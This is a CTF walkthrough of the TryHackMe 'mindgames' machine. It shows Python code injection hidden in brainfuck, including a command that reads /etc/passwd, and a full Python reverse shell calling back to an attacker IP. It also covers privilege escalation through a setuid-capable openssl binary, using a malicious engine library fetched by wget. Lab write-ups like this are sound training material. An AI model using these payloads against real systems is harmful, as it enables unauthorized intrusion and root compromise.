# tryhackme - mindgames
This text is about the CTF Challenge **mindgames**, found on tryhackme.com.
The description of this challenge is straight forward:

`No hints. Hack it. Don't give up if you get stuck, enumerate harder`

Sounds fun. Let's start.

## Enumerating the target
I usually add an entry for the target to the `/etc/hosts`file. Therefore, the target will be referred to as `mindgames.thm`

### nmap
Our enumeration begins with a nmap scan:
```bash
$ nmap -A -sV -sC mindgames.thm -v -v -p1-65535 -oN mindgames.thm.nmap

# Nmap 7.91 scan initiated Fri Apr 16 21:36:38 2021 as: nmap -A -sV -sC -v -v -p1-65535 -oN mindgames.nmap mindgames.thm
Increasing send delay for 10.10.168.133 from 0 to 5 due to 545 out of 1815 dropped probes since last increase.
Nmap scan report for mindgames.thm (10.10.168.133)
Host is up, received echo-reply ttl 63 (0.025s latency).
rDNS record for 10.10.168.133: mindgames
Scanned at 2021-04-16 21:36:38 CEST for 382s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDffdMrJJJtZTQTz8P+ODWiDoe6uUYjfttKprNAGR1YLO6Y25sJ5JCAFeSfDlFzHGJXy5mMfV5fWIsdSxvlDOjtA4p+P/6Z2KoYuPoZkfhOBrSUZklOig4gF7LIakTFyni4YHlDddq0aFCgHSzmkvR7EYVl9qfxnxR0S79Q9fYh6NJUbZOwK1rEuHIAODlgZmuzcQH8sAAi1jbws4u2NtmLkp6mkacWedmkEBuh4YgcyQuh6jO+Qqu9bEpOWJnn+GTS3SRvGsTji+pPLGnmfcbIJioOG6Ia2NvO5H4cuSFLf4f10UhAC+hHy2AXNAxQxFCyHF0WVSKp42ekShpmDRpP
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNlJ1UQ0sZIFC3mf3DFBX0chZnabcufpCZ9sDb7q2zgiHsug61/aTEdedgB/tpQpLSdZi9asnzQB4k/vY37HsDo=
|   256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrqeEIugx9liy4cT7tDMBE59C9PRlEs2KOizMlpDM8h
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mindgames.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/16%OT=22%CT=1%CU=36387%PV=Y%DS=2%DC=T%G=Y%TM=6079E8C
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O
OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=
OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 33.497 days (since Sun Mar 14 08:48:01 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   23.12 ms 10.9.0.1
2   23.19 ms mindgames (10.10.168.133)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 16 21:43:00 2021 -- 1 IP address (1 host up) scanned in 382.95 seconds
```
nmap reveals an SSH service running on port 80 and a golang application running on port 80. As we don't have any credentials right now, looking at the Golang http server seems to be a good starting point.

## Port 80: Golang net/http server
Visiting `http://mindgames.thm` revealed indeed a webpage, a nice contrast to the apache default website I encountered the last days :-)

This is what the website has to say:
```text
Sometimes, people have bad ideas.
Sometimes those bad ideas get turned into a CTF box.
I'm so sorry.

Ever thought that programming was a little too easy? Well, I have just the product for you. Look at the example code below, then give it a go yourself!

Like it? Purchase a license today for the low, low price of 0.009BTC/yr!
Hello, World

+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.

Fibonacci

--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.
```

I'll be f\*cked if that doesn't look like brainf\*ck (**bf** from now on)!

A quick look at the source code of the webpage does reveal an interesting insight on the character of this challenge's creator, but besides a linked javascript file, there is nothing of interest.

The javascript itself is a helper for sending an asynchronous POST request to the backend url `/api/bf`:

```javascript
async function runCode() {
    const programBox = document.querySelector("#code")
    const outBox = document.querySelector("#outputBox")
    outBox.textContent = await (await postData("/api/bf", programBox.value)).text()
}
```

The webpage even offers you to interpret your own code and offers some samples. Trying out the `Hello, World` example indeed returns the result: `Hello, World`.

Typing in a command doesn't return results, also it seems to handle gibberish quite as well. I have not much knowledge about bf, so I simply copy about two thirds of the first example code and try to run that as well. To my surprise, I receive an error:
```text
  File "<string>", line 1
    print("Hello,
                ^
SyntaxError: EOL while scanning string literal
```
That error style looks familiar. Let's look at that bf code a little closer! I use [this](https://copy.sh/brainfuck) to translate the example to something a normal human being enjoys reading and get 
```python
print("Hello, World")
```

Alright, I don't know much about bf, but I have not heard about functions in bf itself, so is this probably just obfuscating another language?

Let's look at the Fibonacci example!
```python
def F(n):
    if n <= 1:
        return 1
    return F(n-1)+F(n-2)


for i in range(10):
    print(F(i))
```
A `def` keyword, no semicolons and no curly braces? That looks a lot like **python**! We can verify that by again using the aforementioned webpage which also offers a text to bf translator: http://copy.sh/brainfuck/text.html

```python
import os
os.system("cat /etc/passwd")
```
becomes
```brainfuck
+[----->+++<]>++.++++.+++.-.+++.++.[---->+<]>+++.+++++[->+++<]>.++++.>++++++++++.-[------->+<]>.++++.+[++>---<]>.[--->++<]>-.++++++.------.+.+++[->+++<]>.++++++++.+++[++>---<]>.------.-[->+++<]>.--.--[--->+<]>-.[---->+<]>+++.[-->+++<]>-.[--->+<]>.[--->+<]>---.++[->+++<]>+.-[-->+<]>--.+[----->+<]>.[----->++<]>+.--[--->+<]>--..++++.[->+++<]>-.-[--->+<]>+.+++++++.
```
Bingo! We retrieve a result:
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
mindgames:x:1001:1001:,,,:/home/mindgames:/bin/bash
```
Since that works, we can start to hijack the machine...

## Exploitation
### Getting a foothold: Initial shell
#### Preparation
Constructing a reverse shell in python is straightforward (example taken from [here](https://blog.finxter.com/python-one-line-reverse-shell/)):
```python
import pty
import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP.ADDR.OF.ATTACKER", 5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```
becomes
```brainfuck
+[----->+++<]>++.++++.+++.-.+++.++.[---->+<]>+++.[-->+++++++<]>.++++.+++++.>++++++++++.--[----->+<]>+.++++.+++.-.+++.++.[---->+<]>+++.---[->++++<]>-.----.------------.++++++++.------.[--->+<]>---.[++>---<]>--.-[----->+<]>.++++.>++++++++++.+[--------->+<]>.+[-->+<]>+++.---[->++<]>-.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.[--->++<]>-.----.------------.++++++++.------.[--->+<]>---.+[--->+<]>+.--[->+++<]>+.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.--[-->+++<]>-.+++++.[->+++++<]>+.[--->+++++<]>.+++++.---------.>-[--->+<]>-.[-->+<]>++.-[--->++<]>+.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.>-[--->+<]>--.----.[----->+<]>.++++++++.--[----->+++<]>.------------.+.--.-[->++++<]>+.----.++++++++++++.+[-->+<]>++.>++++++++++.+[--------->+<]>.+[++>---<]>.--[--->+<]>-.++++++++++++.-..---------.--.-[--->+<]>--.+[--->+<]>+..------.++[->++<]>+.+++++++.[-->+<]>++++++.--[-->+++<]>-.+++..[->+++++<]>--.[-->+<]>+++++.------[->++<]>-.---------.-[--->++<]>.--[-->+++<]>-.>-[--->+<]>-..[---->+++<]>++.++.++++++++.------.+++++++++++++.[-->+<]>-------.++++++++++.------------.-----[->++<]>-....------------..>++++++++++.-[------->+<]>.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.++++.-------.>++++++++++.-[------->+<]>.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.+++++.--------.>++++++++++.-[------->+<]>.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.++++++.---------.>++++++++++.-[------->+<]>+.++++.+++++.-----[++>---<]>.[--->++<]>-.---.[----->++<]>+.+[--->+<]>+.---------.++[++>---<]>.------.+++++++++++++.++[->++<]>.+++++++.+++++.++[->+++++<]>-.++[->++<]>.-.--[--->+<]>--.-----------.--[--->+<]>.+++++++.
```
#### Execution
Start a netcat listener on your machine
```bash
$ nc -lnvp 5555
```
Trigger the reverse shell
```bash
$ curl -X POST --data "${bfshellcode}" http://mindgames.thm/api/bf
```
the shell should spawn in your netcat listener. 
In the home directory of the current user you find the obligatory user.txt:
```bash
$ cat user.txt
thm{RETRACTED}
```
### Getting root
#### Preparation
I ran linpeas on the target machine and found three binaries with enabled capabilities:
```text
Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep is writable
```
That `cap_setuid` looks sweet!
[GTFObins](https://gtfobins.github.io/gtfobins/openssl/#library-load) tells us that `It loads shared libraries that may be used to run code in the binary execution context.`
```bash
$ openssl req -engine ./lib.so
```
Great, so I just need my own openssl engine? How hard can that be? Turns out: quite simple, the openssl team provides the skeleton for our exploit on a fancy blog page called [Engine Building Lesson 1: A Minimum Useless Engine](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/). Not so useless, anymore!

Using the provided example I came up with
```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0);
    system("/bin/sh");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
The blog even tells us how to compile:
```bash
$ gcc -fPIC -o silly-engine.o -c silly-engine.c
$ gcc -shared -o silly-engine.so -lcrypto silly-engine.o
```
### Execution
I started a python webserver and transferred our little exploit to the target.
attacker:
```bash
python -m http.server 12345
```
target:
```bash
wget http://${ip.of.attacking.maching}:12345/silly-engine.so
```
Then, just run the command as instructed by GTFObins:
```bash
openssl req -engine ./silly-engine.so
# id
uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
# cd /root
# cat root.txt
thm{RETRACTED}
```

## Conclusion
That was a fun challenge and more straightforward than the description implied.
